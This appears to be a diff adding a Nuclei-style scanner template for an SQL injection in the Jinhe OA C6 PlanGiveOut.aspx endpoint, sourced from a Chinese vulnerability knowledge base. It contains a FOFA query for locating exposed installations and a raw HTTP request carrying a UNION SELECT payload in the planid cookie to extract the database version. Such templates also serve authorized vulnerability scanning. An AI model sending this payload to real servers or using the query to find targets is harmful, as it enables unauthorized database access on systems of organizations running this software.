@@ -1,0 +1,25 @@
+id: poc-tarxnye3vt24rgpw
+info:
+  name: 金和OA C6 PlanGiveOut.aspx SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tarxnye3vt24rgpw'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tarxnye3vt24rgpw
+    fofa: app="金和网络-金和OA
+http:
+- raw:
+  - 'GET /C6/JHSoft.Web.PlanSummarize/PlanGiveOut.aspx/xxx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+
+    Cookie: planid=1 union all select 1,2,3,4,5,6,7,@@version,9,10,11,12,13-- aa;'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
